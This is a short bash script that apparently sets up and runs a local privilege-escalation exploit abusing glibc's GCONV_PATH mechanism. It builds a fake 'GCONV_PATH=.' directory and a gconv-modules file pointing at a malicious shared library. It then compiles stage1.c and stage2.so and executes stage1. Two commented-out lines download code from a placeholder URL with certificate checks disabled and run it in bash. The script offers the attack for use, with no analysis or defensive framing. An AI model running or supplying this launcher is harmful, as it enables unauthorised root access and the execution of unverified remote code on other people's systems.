#!/bin/bash

#command -v curl >/dev/null && bash -c "$(curl -fsSLk url)" || bash -c "$(wget --no-check-certificate -q0- url)"
#command -v curl >/dev/null && bash -c "$(curl -fsSLk url)" || bash -c "$(wget --no-check-certificate -q0- url)"

mkdir -p 'GCONV_PATH=.'

echo "module UTF-8// STAGE2// stage2 2" > gconv-modules

gcc stage1.c -Wall -fPIC -o stage1
gcc stage2.c -Wall --shared -fPIC -o stage2.so

cp stage2.so GCONV_PATH=./stage2.so:.

./stage1